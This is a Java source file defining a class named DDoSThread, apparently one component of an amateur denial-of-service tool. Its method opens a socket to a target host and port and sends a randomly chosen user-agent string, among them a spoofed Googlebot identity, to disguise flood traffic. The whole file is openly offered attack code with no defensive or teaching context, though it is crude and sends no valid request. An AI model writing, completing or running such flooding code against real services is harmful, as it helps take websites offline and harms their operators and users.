package main;

import java.util.Random;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

public class DDoSThread 
{
	public static void hit(String url, int port) throws UnknownHostException, IOException
	{
		Random r = new Random();
		int userAgent = r.nextInt(8);
		Socket OwOWhatsThis = new Socket(url, port);
		OutputStream oss = OwOWhatsThis.getOutputStream();
		PrintWriter out = new PrintWriter(oss);
		if (userAgent == 0)
		{
			out.print("Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"); 
		}
		else if (userAgent == 1)
		{
			out.print("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0");
		}
		else if (userAgent == 2)
		{
			out.print("Googlebot/2.1 (+http://www.google.com/bot.html)");
		}
		else if (userAgent == 3)
		{
			out.print("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)");
		}
		else if (userAgent == 4)
		{
			out.print("Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1");
		}
		else if (userAgent == 5)
		{
			out.print("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41");
		}
		else if (userAgent == 6)
		{
			out.print("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36 QQBrowser/2.4.2175.400");
		}
		else if (userAgent == 7)
		{
			out.print("MQQBrowser/3.1/Mozilla/5.0 (Linux; U; Android 2.3.6; fa-fa; GT-S5660 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
		}
		out.flush();
	}
}
